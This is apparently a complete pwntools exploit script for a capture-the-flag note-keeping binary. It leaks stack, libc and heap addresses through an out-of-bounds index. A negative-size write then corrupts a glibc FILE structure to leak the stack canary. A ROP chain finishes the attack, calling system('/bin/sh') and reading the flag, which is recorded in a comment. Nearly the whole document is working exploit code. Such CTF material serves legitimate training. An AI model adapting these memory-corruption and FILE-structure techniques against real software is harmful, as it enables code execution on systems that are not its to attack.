#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 33387
HOST = "spawner.cscv.vn"
exe = context.binary = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.39.so', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            # add
            brva 0x00000000000014C9

            # show_note
            brva 0x00000000000015A8

            # show_file
            brva 0x0000000000001662
            b* _IO_file_write+48
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def add(idx, size, data = b'abcd'):
    p.sendlineafter(b'choice: ', str(1))
    p.sendlineafter(b'Index: ', str(idx))
    p.sendlineafter(b'Size: ', str(size))
    p.sendlineafter(b'message: ', data)

def show_note(idx):
    p.sendlineafter(b'choice: ', str(2))
    p.sendlineafter(b'Index: ', str(idx))

def show_file(idx):
    p.sendlineafter(b'choice: ', str(3))
    p.sendlineafter(b'Index: ', str(idx))

# VARIABLE


# PAYLOAD
add(0, 0x20)
show_note(0)
p.recv(8)
stack_leak = u64(p.recv(8))
log.info("Stack leak: " + hex(stack_leak))
canary_addr = stack_leak - 0x160

show_note(18)
p.recvuntil(b'Invalid index\n')
p.recv(0x18)
libc_leak = u64(p.recv(8))
libc.address = libc_leak - 0x2044e0
log.info("Libc base: " + hex(libc.address))
pop_rdi = 0x000000000010f78b + libc.address
ret = pop_rdi + 1
system = libc.sym.system
bin_sh = next(libc.search(b'/bin/sh'))

show_note(19)
p.recvuntil(b'Invalid index\n')
p.recv(0x18)
heap_leak = u64(p.recv(8))
heap_base = heap_leak - 0x570
log.info("Heap base: " + hex(heap_base))

payload = flat(
    0, 0x1e1,
    0xfbad0800, 0, # _flags
    15 # oob write
    # 15 << 5 = 0x1e0
    # 0x1e0 + 0x2a0 = 0x480
    )
add(15, -0x80000000, payload)

payload = flat(
    canary_addr, 0, # _IO_read_end
    canary_addr, canary_addr + 8, # _IO_write_base, _IO_write_ptr
    0x10
    )
add(15, -0x80000000, payload)

payload = flat(
    1, # _fileno (fd)
    0,
    0, 
    heap_leak, # _lock
    0x13
    )
add(15, -0x80000000, payload)

# GDB()
show_file(15)
canary = u64(p.recv(8))
log.info("Canary: " + hex(canary))

payload = flat(
    b'\0'*0x28,
    canary,
    0xdeadbeef, # saved rbp
    pop_rdi,
    bin_sh,
    ret,
    system
    )
add(15, -0x80000000, payload)

p.sendline(b'cat flag.txt')

p.interactive()

# CSCV2025{DuNg_O_du0i_th1_nH4y_M@Nh-1EN-aI_5O-thl_dl_vE-PHONk_crack_phonk_crack0}

# _IO_fwrite -> _IO_file_xsputn -> _IO_file_overflow -> _IO_do_write -> _IO_file_write -> write -> canary